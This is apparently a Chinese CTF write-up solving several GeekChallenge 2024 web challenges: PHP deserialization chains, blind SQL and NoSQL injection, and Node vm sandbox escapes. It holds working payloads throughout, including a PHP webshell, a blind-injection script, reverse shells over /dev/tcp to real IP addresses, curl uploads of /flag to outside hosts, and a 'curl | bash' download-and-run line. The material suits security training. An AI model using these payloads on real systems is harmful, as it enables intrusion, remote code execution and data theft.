        $FUNC=$change($data);
        $FUNC();
    }
}

class Syclover{
    public $Where;
    public $IS;
    public $Starven;
    public $Girlfriend;
    public function __toString()
    {
        echo "__toString is called<br>";
        $eee=new $this->Where($this->IS);
        $fff=$this->Starven;
        $eee->$fff($this->Girlfriend);
       
    }
}

unserialize($_POST['data']);
```

首先我们锁定`__unserialize()`，因为前几天做到过，FFI的学习的时候

> `__unserialize()` 是 PHP 中的一个魔术方法，用于在反序列化对象时自动调用。反序列化是将一个序列化字符串转换为 PHP 变量的过程，而这个过程在对象的情况下会调用该对象的 `__unserialize()` 方法。
>
> 当 __serialize 方法存在时，参数为 __serialize 的返回数组；当 __serialize 方法不存在时，参数为实例对象的所有属性值组合而成的数组

emm但是还是不够熟悉下一步咋触发我就不知道了，我们写个demo

```php
<?php

class MyClass {
    public $name;
    public $value;

    public function __construct($name, $value) {
        $this->name = $name;
        $this->value = $value;
    }
    // 反序列化时触发
    public function __unserialize(array $data) {
        // 可以自定义逻辑，例如记录日志或验证数据
        echo "Unserializing object...\n";
        print_r($data);
        $this->name = $data['name'];
        $this->value = $data['value'];
    }
    public function __destruct() {
        echo "Destructing object...\n";
    }
}
$originalObject = new MyClass("Example", 123);
$serializedObject = serialize($originalObject);
$unserializedObject = unserialize($serializedObject);
```

这里反序列化之后直接跳转的`__unserialize`

![1](QQ20241201-151847.jpg)

所以就是这个方法肯定触发而且还比destruct快，而对于`$FUNC();`，这里写个demo可以知道如果用数组可以直接触发其中方法

```php
<?php
class Geek{
    public function test(){
        echo "test";
    }
}
$a=array(new Geek(),"test");
$a();
```

那么我们现在就可以触发`Sink`了，只不过还需要找一个函数可以把这个$FUNC能变成数组的

```php
<?php
class Challenge{
    public $file;
    public function Sink()
    {
        echo "<br>!!!A GREAT STEP!!!<br>";
        echo "Is there any file?<br>";
        if(file_exists($this->file)){
            global $FLAG;
            echo $FLAG;
        }
    }
}
class Geek{
    public $a;
    public $b;
    public function __unserialize(array $data): void
    {
        $change=$_GET["change"];
        $FUNC=$change($data);
        $FUNC();
    }
}
$a=new Geek();
$a->a=new challenge();
$a->a->file="secret.php";
$a->b="Sink";
echo serialize($a);

/*change=array_values
```

```
Geek::unserialize->Challenge::Sink->Syclover::toString
```

原生类调用函数

```php
<?php
function title($title, $name)
{
    return sprintf("%s. %s\r\n", $title, $name);
}

$function = new ReflectionFunction('title');

echo $function->invokeArgs(array('Dr', 'Phil'));
// echo $function->invoke('Dr', 'Phil');
?>
```

```php
<?php
class Challenge{
    public $file;
}
class Geek{
    public $a;
    public $b;
}
class Syclover{
    public $Where;
    public $IS;
    public $Starven;
    public $Girlfriend;
}
$a=new Geek();
$a->a=new challenge();
$a->b="Sink";
$a->a->file=new Syclover();
$a->a->file->Where="ReflectionFunction";
$a->a->file->IS="system";
$a->a->file->Starven="invokeArgs";
$a->a->file->Girlfriend=array('echo "PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=="|base64 -d > shell.php');
echo serialize($a);

/*change=array_values
```

然后suid提权就可以了

```
find / -perm -u=s -type f 2>/dev/null
system("/bin/bash -c 'exec bash -i &>/dev/tcp/156.238.233.93/9999 <&1'");
file -f /flag
```

不过这里还是有点插曲的，我用命令弹shell始终没有成功，后面我索性直接写个文件来弹就成功了

```php
<?php
system("/bin/bash -c 'exec bash -i >& /dev/tcp/156.238.233.93/9999 <&1'");
?>
```

## not_just_pop

```php
<?php
highlight_file(__FILE__);
ini_get('open_basedir');

class lhRaMK7{
    public $Do;
    public $You;
    public $love;
    public $web;
    public function __invoke()
    {
        echo "我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？"."<br>";
        eval($this->web);
    }
    public function __wakeup()
    {
        $this->web=$this->love;
    }
    public function __destruct()
    {
        die($this->You->execurise=$this->Do);
    }

}

class Parar{
    private $execurise;
    public $lead;
    public $hansome;
    public function __set($name,$value)
    {
        echo $this->lead;
    }
    public function __get($args)
    {
        if(is_readable("/flag")){
            echo file_get_contents("/flag");
        }
        else{
            echo "还想直接读flag，洗洗睡吧，rce去"."<br>";
            if ($this->execurise=="man!") {
                echo "居然没坠机"."<br>";
                if(isset($this->hansome->lover)){
                    phpinfo();
                }
            }
            else{
                echo($this->execurise);
                echo "你也想被肘吗"."<br>";
            }
        }
    }
}

class Starven{
    public $girl;
    public $friend;
    public function __toString()
    {
        return "试试所想的呗，说不定成功了"."<br>".$this->girl->abc;
    }
    public function __call($args1,$args2)
    {
        $func=$this->friend;
        $func();
    }

}
class SYC{
    private $lover;
    public  $forever;
    public function __isset($args){
        return $this->forever->nononon();
    }

}


$Syclover=$_GET['Syclover'];
if (isset($Syclover)) {
    unserialize(base64_decode($Syclover));
    throw new Exception("None");
}else{
    echo("怎么不给我呢，是不喜欢吗？");
}
```

GC绕过，然后emm看看链子触发

```
lhRaMK7::destruct->Parar::set->Strven::toString->Parar::get->SYC::isset->Strven::call->lhRaMK7::invoke
```

```php
<?php

class lhRaMK7{
    public $Do;
    public $You;
    public $love;
    public $web;
}

class Parar{
    private $execurise="man!";
    public $lead;
    public $hansome;
}

class Starven{
    public $girl;
    public $friend;
}
class SYC{
    private $lover="abc";
    public  $forever;
}

$a=new lhRaMK7();
$a->You=new Parar();
$a->You->lead=new Starven();
$a->You->lead->girl=new Parar();
$a->You->lead->girl->hansome=new SYC();
$a->You->lead->girl->hansome->forever=new Starven();
$a->You->lead->girl->hansome->forever->friend=new lhRaMK7();
$a->You->lead->girl->hansome->forever->friend->love="echo 1;";
// $a->You->lead->girl->hansome->forever->friend->love = "file_put_contents('/tmp/a.php', '<?php eval(\$_POST[\\'a\\']); ');";
// $a->You->lead->girl->hansome->forever->friend->love="include '/tmp/a.php';";

$b=array(0=>$a,1=>null);
$c=str_replace("i:1;N;}","i:0;N;}",$b);
echo base64_encode(serialize($b));

```

终于是成功了啊，给我类似了

![1](QQ20241201-182325.jpg)

反正咋也不懂，挨着试试就知道用这个

```
sudo -l
sudo env bash -c 'tac /flag'
```

## ezpop

```php
<?php
Class SYC{
    public $starven;
    public function __call($name, $arguments){
        if(preg_match('/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i',$this->starven)){
            die('no hack');
        }
        file_put_contents($this->starven,"<?php exit();".$this->starven);
    }
}

Class lover{
    public $J1rry;
    public $meimeng;
    public function __destruct(){
        if(isset($this->J1rry)&&file_get_contents($this->J1rry)=='Welcome GeekChallenge 2024'){
            echo "success";
            $this->meimeng->source;
        }
    }

    public function __invoke()
    {
        echo $this->meimeng;
    }

}

Class Geek{
    public $GSBP;
    public function __get($name){
        $Challenge = $this->GSBP;
        return $Challenge();
    }

    public function __toString(){
        $this->GSBP->Getflag();
        return "Just do it";
    }

}

if($_GET['data']){
    if(preg_match("/meimeng/i",$_GET['data'])){
        die("no hack");
    }
   unserialize($_GET['data']);
}else{
   highlight_file(__FILE__);
}
```

这里进来看到要绕过`exit`，链子的话还是简单不少

```
lover::destruct->Geek::get->lover::invoke->Geek::toString->SYC::call
```

这里死亡绕过的话，我找了找资料基本是不能直接写马的，只能用htaccess进行预包含或者是url二次编码绕过

```
php://filter/write=string.strip_tags/?>php_value auto_prepend_file /flag\n#/resource=.htaccess
    
php://filter/write=string.%7%32ot13|<?cuc cucvasb();?>|/resource=shell.php
```

利用协议去包含`/flag`

```php
<?php
Class SYC{
    public $starven;
}

Class lover{
    public $J1rry="data://text/plain,Welcome GeekChallenge 2024";
    public $meimeng;

}

Class Geek{
    public $GSBP;
}
$a=new lover();
$a->meimeng=new Geek();
$a->meimeng->GSBP=new lover();
$a->meimeng->GSBP->meimeng=new Geek();
$a->meimeng->GSBP->meimeng->GSBP=new SYC();
$a->meimeng->GSBP->meimeng->GSBP->starven="php://filter/write=string.strip_tags/?>php_value auto_prepend_file /flag\n#/resource=.htaccess";
$b=serialize($a);
$c=str_replace("s:7:\"meimeng\";","S:7:\"\\6deimeng\";",$b);
echo $b."\n";
echo urlencode($c)."\n";

```

## rce_me

```php
<?php
header("Content-type:text/html;charset=utf-8");
highlight_file(__FILE__);
error_reporting(0);

# Can you RCE me?


if (!is_array($_POST["start"])) {
    if (!preg_match("/start.*now/is", $_POST["start"])) {
        if (strpos($_POST["start"], "start now") === false) {
            die("Well, you haven't started.<br>");
        }
    }
}

echo "Welcome to GeekChallenge2024!<br>";

if (
    sha1((string) $_POST["__2024.geekchallenge.ctf"]) == md5("Geekchallenge2024_bmKtL") &&
    (string) $_POST["__2024.geekchallenge.ctf"] != "Geekchallenge2024_bmKtL" &&
    is_numeric(intval($_POST["__2024.geekchallenge.ctf"]))
) {
    echo "You took the first step!<br>";

    foreach ($_GET as $key => $value) {
        $$key = $value;
    }

    if (intval($year) < 2024 && intval($year + 1) > 2025) {
        echo "Well, I know the year is 2024<br>";

        if (preg_match("/.+?rce/ism", $purpose)) {
            die("nonono");
        }

        if (stripos($purpose, "rce") === false) {
            die("nonononono");
        }
        echo "Get the flag now!<br>";
        eval($GLOBALS['code']);
        
        

        
    } else {
        echo "It is not enough to stop you!<br>";
    }
} else {
    echo "It is so easy, do you know sha1 and md5?<br>";
}
?>
```

首先`strpos`，直接传入即可，弱比较0e绕过

```
Geekchallenge2024_bmKtL
md5:
0e073277003087724660601042042394

10932435112
sha1:
0e07766915004133176347055865026311692244
```

intval绕过`10e9`

```http
POST /?year=10e9&purpose=rce&code=echo%20`tac%20/flag`; HTTP/1.1
Host: 80-fdc728c1-2099-47d0-a7df-5f37c22ca15c.challenge.ctfplus.cn
Content-Length: 54
Pragma: no-cache
Cache-Control: no-cache
Origin: http://80-fdc728c1-2099-47d0-a7df-5f37c22ca15c.challenge.ctfplus.cn
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://80-fdc728c1-2099-47d0-a7df-5f37c22ca15c.challenge.ctfplus.cn/?year=10e9&purpose=rce&code=echo%20`tac%20/flag`;
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

start=start+now&_%5B2024.geekchallenge.ctf=10932435112
```

## funnySQL

说了字母全是小写，那我猜就是一个盲注了，fuzz一下，474是不准用，好多东西都被过滤了，但是看过狗神那篇文章的应该知道怎么绕过吧？

```
'||if((2>1),BENCHMARK(1000000000,md5('test')),1)#
```

那么就是开始注入了，但是or也被禁用了，这里我们使用另一个东西来查表，本来想的是直接查flag来猜结果没有成功

```
'||if((substr(database(),1,1)like's'),BENCHMARK(1000000000,md5('test')),1)#
```

依次类推

```python
"'||if((substr(database(),{},1)like'{}'),BENCHMARK(10000,md5('test')),1)#".format(i,s)
```

然后我发现这个设置的多的话延时太长了，然后稍微调整了一下不过空格被过滤之后每次我都容易写错，慢慢改没事

```python
import requests
import time

url="http://80-e919e7c0-22d2-4a03-b525-6666bf8d7015.challenge.ctfplus.cn/index.php"
strings="qwertyuiopasdfghjklzxcvbnm0123456789-{}QWERTYUIOPASDFGHJKLZXCVBNM"
target=""
for i in range(1,50):
    for s in strings:
        # payload = "'||if((substr(database(),{},1)like'{}'),BENCHMARK(10000,md5('test')),1)#".format(i,s)
        # syclover
        # payload = "'||if((substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)like'syclover'),{},1)like'{}'),BENCHMARK(10000000000,md5('test')),1)#".format(i, s)
        # Rea11ys3ccccccr3333t, users
        payload = "'||if((substr((select(*)from(Rea11ys3ccccccr3333t)),{},1)like'{}'),BENCHMARK(100000000,md5('test')),1)%23".format(i, s)


        start_time = time.time()
        r=requests.get(url,params={'username':payload})
        end_time=time.time()
        if end_time-start_time > 0.5:
            target+=s
            print(target)
            break


```

这个太难注了，搞着搞着，环境都不能在网页访问了

## noSandbox

**芒果db**这个东西nosql注入之前在Ctfshow里面做到过

```http
POST /login HTTP/1.1
Host: 3000-52233ec6-873c-4484-b58c-d32e85fb4261.challenge.ctfplus.cn
Content-Length: 43
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://3000-52233ec6-873c-4484-b58c-d32e85fb4261.challenge.ctfplus.cn
Referer: http://3000-52233ec6-873c-4484-b58c-d32e85fb4261.challenge.ctfplus.cn/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

{"username":{"$ne":1},"password":{"$ne":1}}
```

```http
HTTP/1.1 302 Found
Date: Mon, 02 Dec 2024 13:00:20 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 30
Connection: close
X-Powered-By: Express
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3NGRhZjI2ZmI5YzIzNjQyMmQ4MWRlMSIsInVzZXJuYW1lIjoiSjFyclkiLCJpYXQiOjE3MzMxNDQ1MjUsImV4cCI6MTczMzE0ODEyNX0.e68jREZpirKOYri9KyEoYdFh9_dP5t083JXFvdy9yBs; Path=/; HttpOnly
Location: /execute
Vary: Accept
Cache-Control: no-cache

Found. Redirecting to /execute
```

访问之后把token弄上，就有框框了，那么审计代码了该

```js
//泄露的代码执行和WAF部分代码,不能直接运行

const vm = require('vm');

function waf(code,res) {
    let pattern = /(find|ownKeys|fromCharCode|includes|\'|\"|replace|fork|reverse|fs|process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function|env)/m;
    if (code.match(pattern)) {
        console.log('WAF detected malicious code');
        res.status(403).send('WAF detected malicious code');
        exit();
    }
}


app.post('/execute', upload.none(), (req, res) => {
    let code = req.body.code;
    const token = req.cookies.token;

    if (!token) {
        return res.status(403).send('Missing execution code credentials.');
    }
    if (!jwt.verify(token, JWT_SECRET)) {
        return res.status(403).send('Invalid token provided.');
    }

    console.log(`Received code for execution: ${code}`);

    try {
        waf(code,res);
        let sandbox = Object.create(null);
        let context = vm.createContext(sandbox);

        let script = new vm.Script(code);
        console.log('Executing code in sandbox context');
        script.runInContext(context);

        console.log(`Code executed successfully. Result: ${sandbox.result || 'No result returned.'}`);
        res.json('Code executed successfully' );
    } catch (err) {
        console.error(`Error executing code: ${err.message}`);
        res.status(400).send(`Error: there's no display back here,may be it executed successfully?`);
    }
});
```

![1](QQ20241202-211457.jpg)

这个不是很懂直接拿别的师傅的poc打了

```js
throw new Proxy({}, {
get: function(){
const test =`Process`.toLocaleLowerCase();
const exp =`child_Process`.toLocaleLowerCase();
const cc = arguments.callee.caller;
const p = (cc.constructor.constructor(`return ${test}`))();
const obj = p.mainModule.require(`${exp}`);
const ex = Object.getOwnPropertyDescriptor(obj,
`${`${`exe`}cSync`}`);
return ex.value(`curl http://g9q7bbsg1zzs0ke84axx2luwpnvdj2.oastify.com/ -T /flag`).toString();
}
})
```

![1](QQ20241202-213853.jpg)

成功了但是没有拿到回显，那么只能换一种方法了，或者说换个平台？

用这个平台，之前Ctfshow用来打xss的，外带其实也挺好用，就是没有bp顺手罢了

```
http://ceye.io/records/http
```

```js
throw new Proxy({}, {
get: function(){
const test =`Process`.toLocaleLowerCase();
const exp =`child_Process`.toLocaleLowerCase();
const cc = arguments.callee.caller;
const p = (cc.constructor.constructor(`return ${test}`))();
const obj = p.mainModule.require(`${exp}`);
const ex = Object.getOwnPropertyDescriptor(obj,
`${`${`exe`}cSync`}`);
return ex.value(`curl hrcgnc.ceye.io -T /flag`).toString();
}
})
```

![1](QQ20241202-214156.jpg)

```js
throw new Proxy({}, {
    get: function() {
        const cc = arguments.callee.caller;
        const p = (cc.constructor.constructor(`${`${`return proc`}ess`}`))(); 
        const chi = p.mainModule.require(`${`${`child_proces`}s`}`);
        const res = Reflect.get(chi, `${`${`exe`}cSync`}`)(`sleep 5`);
        return res.toString(); 
    }
});
```

成功sleep但是如果要拿flag的话得改改payload(改了好久的)，测了一会发现这样子直接nc监听是可以拿到flag的

```js
throw new Proxy({}, {
get: function(){
const test =`Process`.toLocaleLowerCase();
const exp =`child_Process`.toLocaleLowerCase();
const cc = arguments.callee.caller;
const p = (cc.constructor.constructor(`return ${test}`))();
const obj = p.mainModule.require(`${exp}`);
const ex = Object.getOwnPropertyDescriptor(obj,
`${`${`exe`}cSync`}`);
return ex.value(`curl http://38.22.92.200:9999/ -T /flag`).toString();
}
})
```

![1](QQ20241202-220016.jpg)

```http
POST /execute HTTP/1.1
Host: 3000-52233ec6-873c-4484-b58c-d32e85fb4261.challenge.ctfplus.cn
Content-Length: 564
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4BH9KtFU6HowVd7O
Accept: */*
Origin: http://3000-52233ec6-873c-4484-b58c-d32e85fb4261.challenge.ctfplus.cn
Referer: http://3000-52233ec6-873c-4484-b58c-d32e85fb4261.challenge.ctfplus.cn/execute
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3NGRhZjI2ZmI5YzIzNjQyMmQ4MWRlMSIsInVzZXJuYW1lIjoiSjFyclkiLCJpYXQiOjE3MzMxNDg4NzEsImV4cCI6MTczMzE1MjQ3MX0.bWxo_zEF1gp435VJBEVL8mXBHJS3-Z3paf8TogpR5aI
Connection: close

------WebKitFormBoundary4BH9KtFU6HowVd7O
Content-Disposition: form-data; name="code"

throw new Proxy({}, {
get: function(){
const test =`Process`.toLocaleLowerCase();
const exp =`child_Process`.toLocaleLowerCase();
const cc = arguments.callee.caller;
const p = (cc.constructor.constructor(`return ${test}`))();
const obj = p.mainModule.require(`${exp}`);
const ex = Object.getOwnPropertyDescriptor(obj,
`${`${`exe`}cSync`}`);
return ex.value(`curl http://156.238.233.9/shell.sh | bash`).toString();
}
})ls

------WebKitFormBoundary4BH9KtFU6HowVd7O--

```

```sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/156.238.233.9/4444 0>&1
```

写了挺久的哈哈，终于拿到了

![1](QQ20241202-221754.jpg)

## escapeSandbox_PLUS

```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY ./app /app
COPY ./flag /flag
EXPOSE 3000
CMD ["node","/app/app.js"]
```

拿到了Dockerfile但是不知道有什么作用，还有源码当然

```js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const multer = require('multer');
const { VM } = require('vm2');
const crypto = require('crypto');
const path = require('path');

const app = express();


app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


app.use(express.static(path.join(__dirname, 'public')));

const sessionSecret = crypto.randomBytes(64).toString('hex');
app.use(session({
    secret: sessionSecret,
    resave: false,
    saveUninitialized: true,
}));


const upload = multer();


app.post('/login', (req, res) => {
    const { username, passwd } = req.body;


    if (username.toLowerCase() !== 'syclover' && username.toUpperCase() === 'SYCLOVER' && passwd === 'J1rrY') {
        req.session.isAuthenticated = true;
        res.json({ message: 'Login successful' });
    } else {
        res.status(401).json({ message: 'Invalid credentials' });
    }
});


const isAuthenticated = (req, res, next) => {
    if (req.session.isAuthenticated) {
        next();
    } else {
        res.status(403).json({ message: 'Not authenticated' });
    }
};


app.post('/execute', isAuthenticated, upload.none(), (req, res) => {
    let code = req.body.code;

    let flag = false;

    
    for (let i = 0; i < code.length; i++) {
        if (flag || "/(abcdefghijklmnopqrstuvwxyz123456789'\".".split``.some(v => v === code[i])) {
            flag = true;
            code = code.slice(0, i) + "*" + code.slice(i + 1, code.length);
        }
    }

    try {

        const vm = new VM({
            sandbox: {
                require: undefined,
                setTimeout: undefined,
                setInterval: undefined,
                clearTimeout: undefined,
                clearInterval: undefined,
                console: console
            }
        });


        const result = vm.run(code.toString());
        console.log('执行结果:', result);
        res.json({ message: '代码执行成功', result: result });

    } catch (e) {

        console.error('执行错误:', e);
        res.status(500).json({ error: '代码执行出错', details: e.message });
    }
});




app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

process.on('uncaughtException', (err) => {
    console.error('捕获到未处理的异常:', err);

});


process.on('unhandledRejection', (reason, promise) => {
    console.error('捕获到未处理的 Promise 错误:', reason);

});


setTimeout(() => {
    throw new Error("模拟的错误");
}, 1000);


setTimeout(() => {
    Promise.reject(new Error("模拟的 Promise 错误"));
}, 2000);

app.listen(3000, () => {
    console.log('Server is running on port 3000');
});

```

![1](QQ20241202-222105.jpg)

等会这里P牛写过一篇js大小写字母转换特性

[P牛](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)

> 其中混入了两个奇特的字符"ı"、"ſ"。
>
>   这两个字符的“大写”是I和S。也就是说"ı".toUpperCase() == 'I'，"ſ".toUpperCase() == 'S'。通过这个小特性可以绕过一些限制。
>
>   同样，toLowerCase也有同样的字符：
>
> 这个"K"的“小写”字符是k，也就是"K".toLowerCase() == 'k'.

那么先绕过登录

```http
POST /login HTTP/1.1
Host: 3000-224f02c4-e982-4a86-aa43-d3c1ec7ad825.challenge.ctfplus.cn
Content-Length: 41
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://3000-224f02c4-e982-4a86-aa43-d3c1ec7ad825.challenge.ctfplus.cn
Referer: http://3000-224f02c4-e982-4a86-aa43-d3c1ec7ad825.challenge.ctfplus.cn/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: connect.sid=s%3A_9hkPMui5yv9G_MMrWMLT7flOp2xv9eg.MrAYCNkWXUZnz4wbvpB8U99jCMbnk57XsNCVw5VUsqM
Connection: close

{"username":"ſyclover","passwd":"J1rrY"}
```

然后就是沙箱逃逸，这玩意不看了，看着有点费神

# 0x03 小结

还是很好的题目，来来回回用碎片化时间搞了挺久的
